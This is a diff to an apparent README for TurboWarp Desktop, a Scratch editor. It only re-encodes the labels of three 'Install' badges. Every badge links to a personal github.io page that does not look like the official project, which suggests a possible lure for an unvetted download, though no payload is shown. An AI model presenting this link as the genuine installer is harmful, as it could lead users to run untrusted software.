@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install TurboWarp Desktop](https://img.shields.io/badge/⬇_Install_TurboWarp%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install TurboWarp Desktop](https://img.shields.io/badge/⬇_Install_TurboWarp+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ TurboWarp Desktop is an enhanced, offline version of Scratch with significant pe
 
 <div align="center">
 
-[![⬇ Install TurboWarp Desktop](https://img.shields.io/badge/⬇_Install_TurboWarp%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install TurboWarp Desktop](https://img.shields.io/badge/⬇_Install_TurboWarp+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ TurboWarp Desktop is an enhanced, offline version of Scratch with significant pe
 
 <div align="center">
 
-[![⬇ Install TurboWarp Desktop](https://img.shields.io/badge/⬇_Install_TurboWarp%20Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install TurboWarp Desktop](https://img.shields.io/badge/⬇_Install_TurboWarp+Desktop-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
